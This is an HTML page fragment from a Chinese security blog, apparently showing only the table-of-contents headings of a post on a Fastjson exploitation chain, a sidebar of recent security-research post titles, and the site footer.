href="#Step-4%EF%BC%9A%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF%EF%BC%88JSON-parse-FatJar%EF%BC%89"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">Step 4：完整攻击链路（JSON.parse + FatJar）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-5%EF%BC%9A%E8%BF%9C%E7%A8%8B%E6%94%BB%E5%87%BB%EF%BC%88%E8%B7%A8%E8%BF%9B%E7%A8%8B%EF%BC%89"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">Step 5：远程攻击（跨进程）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E5%85%B3%E9%94%AE%E6%96%AD%E7%82%B9%E4%BD%8D%E7%BD%AE%EF%BC%88%E7%94%A8%E4%BA%8E-IDEA-Eclipse-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%EF%BC%89"><span class="toc-number">1.5.3.</span> <span class="toc-text">5.3 关键断点位置（用于 IDEA&#x2F;Eclipse 动态调试）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%A4%B1%E8%B4%A5%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90"><span class="toc-number">1.6.</span> <span class="toc-text">六、失败原因分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-JDK-%E7%89%88%E6%9C%AC%E4%B8%8D%E5%8C%B9%E9%85%8D"><span class="toc-number">1.6.1.</span> <span class="toc-text">6.1 JDK 版本不匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-ClassLoader-%E4%B8%8D%E6%98%AF-LaunchedURLClassLoader"><span class="toc-number">1.6.2.</span> <span class="toc-text">6.2 ClassLoader 不是 LaunchedURLClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-SafeMode-%E5%B7%B2%E5%BC%80%E5%90%AF"><span class="toc-number">1.6.3.</span> <span class="toc-text">6.3 SafeMode 已开启</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-4-%E7%B1%BB%E7%BC%93%E5%AD%98%E5%AF%BC%E8%87%B4-%E4%B8%8D%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C"><span class="toc-number">1.6.4.</span> <span class="toc-text">6.4 类缓存导致 &lt;clinit&gt; 不重复执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-Probe-HTTP-%E6%9C%8D%E5%8A%A1%E6%9C%AA%E5%90%AF%E5%8A%A8%E6%88%96-jar-%E4%B8%8D%E4%B8%80%E8%87%B4"><span class="toc-number">1.6.5.</span> <span class="toc-text">6.5 Probe HTTP 服务未启动或 jar 不一致</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-6-macOS-%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%90%86%E6%8B%A6%E6%88%AA"><span class="toc-number">1.6.6.</span> <span class="toc-text">6.6 macOS 系统代理拦截</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.7.</span> <span class="toc-text">七、防御建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%E6%88%AA%E5%9B%BE"><span class="toc-number">1.8.</span> <span class="toc-text">八、攻击成功截图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E6%A0%B8%E5%BF%83%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="toc-number">1.9.</span> <span class="toc-text">九、核心经验总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/fastjson%E6%97%A0gadget%E7%BB%95%E8%BF%87RCE/" title="Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记">Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记</a><time datetime="2026-07-21T14:31:00.000Z" title="发表于 2026-07-21 22:31:00">2026-07-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B5%85%E8%B0%88RASP%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/" title="浅谈RASP原理及绕过">浅谈RASP原理及绕过</a><time datetime="2026-05-22T10:42:04.000Z" title="发表于 2026-05-22 18:42:04">2026-05-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" title="TemplatesImpl利用链分析">TemplatesImpl利用链分析</a><time datetime="2026-05-19T09:39:53.000Z" title="发表于 2026-05-19 17:39:53">2026-05-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/AD%E2%80%94Attacking%E9%9A%8F%E7%AC%94/" title="AD—Attacking随笔">AD—Attacking随笔</a><time datetime="2026-04-08T13:07:57.000Z" title="发表于 2026-04-08 21:07:57">2026-04-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/zipslip%E6%94%BB%E5%87%BB%E5%88%9D%E6%8E%A2%E4%BB%A5%E5%8F%8A%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" title="zipslip攻击初探以及在ctf中的应用">zipslip攻击初探以及在ctf中的应用</a><time datetime="2026-03-28T12:15:58.000Z" title="发表于 2026-03-28 20:15:58">2026-03-28</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Timind</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
